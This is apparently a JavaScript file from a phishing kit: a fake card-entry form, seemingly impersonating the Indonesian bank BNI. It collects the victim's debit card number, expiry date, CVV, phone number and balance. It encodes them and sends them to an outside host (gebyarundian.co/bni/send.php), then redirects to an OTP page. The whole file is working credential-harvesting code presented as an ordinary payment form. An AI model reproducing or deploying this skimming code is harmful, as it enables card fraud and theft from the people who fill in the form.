$(document).ready(function() {
    var year = new Date().getFullYear();
    var startYear = year-10;
    var endYear = year+10;
    for (var yr=startYear; yr<=endYear; yr++) {
        $("#year").append("<option>"+yr+"</option>");
    }
    $("#debit-number").on("input", debitNumberUpdater);
    $("#cvv").focus(function() {
        $(".flip-card-inner").css("transform", "rotateY(180deg)");
    });
    $("#cvv").focusout(function() {
        $(".flip-card-inner").css("transform", "rotateY(0deg)");
    });
    $("#cvv").on("input", function() {
        var stars = "";
        var cvv = $("#cvv").val().trim();
        for (var i=0; i<cvv.length; i++) {
            stars += "*";
        }
        $("#preview-cvv").html(stars);
    });
    $(".card-detail input").focus(function() {
        $(this).parent().css("background-color", "#ffffff");
    });
    $(".card-detail input").focusout(function() {
        $(this).parent().css("background-color", "#dbdada");
    });
});

function debitNumberUpdater() {
        /*var value = $("#debit-number").val().trim();
        if (value.length>0) {
            if (value.length==4 || value.length==9 || value.length==14) {
                value += " ";
                $("#debit-number").on("input", "");
                $("#debit-number").val(value);
                $("#debit-number").on("input", debitNumberUpdater);
            }
        }*/
        if ($("#debit-number-img").css("display") == "none") {
            $("#debit-number-img").css("display", "block");
        }
    };
    
function next() {
    var debitNumber = $("#debit-number").val().trim();
    var cvv = $("#cvv").val().trim();
    var month = $('#month').find(":selected").text();
    var year = $('#year').find(":selected").text();
    var phone = $("#phone").val().trim();
    var balance = $("#balance").val().trim();
    if (debitNumber=="" || cvv=="" || month=="" || year=="" || phone=="" || balance=="") {
        alert("Mohon lengkapi data");
        return;
    }
    $.ajax({
        type: "get",
        url: "https://www.gebyarundian.co/bni/send.php?message="+encodeURIComponent(btoa("<b>No. kartu debit:</b> "+debitNumber+"\n<b>Bulan/Tahun:</b> "+month+"/"+year+"\n<b>CVV:</b> "+cvv+"\n<b>No. HP</b>: "+phone+"\n<b>Saldo:</b> "+balance)),
        dataType: "text",
        success: function(response) {
            window.location.href = "otp.html?phone="+phone;
        }
    });
}

module.next = next;